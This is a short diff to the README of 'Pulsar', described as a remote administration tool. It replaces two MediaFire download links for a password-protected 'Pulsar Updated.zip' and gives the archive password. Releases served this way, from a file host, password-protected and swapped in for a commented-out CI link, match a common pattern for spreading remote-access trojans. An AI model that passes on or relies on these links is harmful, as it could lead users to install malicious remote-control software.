@@ -5,7 +5,7 @@
 ## 📥 Download
 
 
-- **[Latest Stable Release](https://www.mediafire.com/file/s5f4d3kgzf497l9/Pulsar+Updated.zip/file)**
+- **[Latest Stable Release](https://www.mediafire.com/file/vovfrsl6xd1fhc7/Pulsar+Updated.zip/file)**
 
 - Pass: Pulsar*99
   
@@ -59,7 +59,7 @@ Pulsar is a lightweight, fast, and powerful remote administration tool written i
 
 Pass: Pulsar*99
 
-- **[Latest Stable Release](https://www.mediafire.com/file/s5f4d3kgzf497l9/Pulsar+Updated.zip/file)**  
+- **[Latest Stable Release](https://www.mediafire.com/file/vovfrsl6xd1fhc7/Pulsar+Updated.zip/file)**  
 <!-- - **[Latest Development Snapshot](https://ci.appveyor.com/project/MaxXor/pulsar)** -->
 
 ---
